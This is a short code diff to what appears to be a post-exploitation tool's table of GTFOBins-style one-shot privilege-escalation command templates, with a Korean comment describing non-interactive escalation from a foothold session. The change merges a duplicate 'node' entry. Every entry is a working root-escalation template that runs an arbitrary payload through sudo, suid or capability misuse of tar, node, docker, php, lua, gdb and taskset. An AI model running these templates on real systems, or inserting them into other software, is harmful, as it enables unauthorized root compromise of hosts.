@@ -114,12 +114,13 @@ _ONESHOT: dict[str, dict[str, str]] = {
     "tar": {"sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 "
                     "--checkpoint-action=exec='{payload}'"},
     "node": {"cap": "{bin} -e 'process.setuid(0);require(\"child_process\")"
-                    ".execSync(\"{payload}\",{stdio:\"inherit\"})'"},
+                    ".execSync(\"{payload}\",{stdio:\"inherit\"})'",
+             "sudo": "sudo node -e 'require(\"child_process\")"
+                     ".execSync(\"{payload}\",{stdio:\"inherit\"})'"},
     "docker": {"sudo": "sudo docker run -v /:/mnt --rm alpine chroot /mnt sh -c '{payload}'"},
     # ── 확장(표준 GTFOBins one-shot — 발판 세션에서 비대화형 상승) ──
     "php": {"sudo": "sudo php -r 'system(\"{payload}\");'",
             "suid": "{bin} -r 'posix_setuid(0);system(\"{payload}\");'"},
-    "node": {"sudo": "sudo node -e 'require(\"child_process\").execSync(\"{payload}\",{stdio:\"inherit\"})'"},
     "lua": {"sudo": "sudo lua -e 'os.execute(\"{payload}\")'"},
     "gdb": {"sudo": "sudo gdb -nx -ex 'py import os;os.system(\"{payload}\")' -ex quit"},
     "taskset": {"sudo": "sudo taskset 1 {payload}", "suid": "{bin} 1 /bin/sh -pc '{payload}'"},
